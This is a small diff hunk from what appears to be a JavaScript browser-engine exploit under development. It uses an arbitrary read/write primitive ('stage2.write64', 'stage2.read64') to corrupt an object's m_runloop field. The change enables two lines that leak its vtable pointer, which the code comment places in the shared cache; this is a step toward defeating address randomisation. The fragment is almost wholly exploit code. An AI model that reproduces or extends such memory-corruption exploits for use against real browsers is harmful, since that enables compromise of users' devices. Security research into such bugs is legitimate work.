@@ -639,8 +639,8 @@ for (var i = 0; i < 1000; ++i) {
         print("m_runloop @ " + hex1(m_runloop));
 	stage2.write64(m_runloop,0x41414141);
         //at offset 0 of m_runloop should be a vtable  :) should sit within the shared cache
-        //var vtable = stage2.read64(m_runloop);
-        //print("vtable @ " + hex1(vtable));
+        var vtable = stage2.read64(m_runloop);
+        print("vtable @ " + hex1(vtable));
 	//stage2.write64(hex1(vtable),0x7777);
 	//gc();
         //stage.passGC();
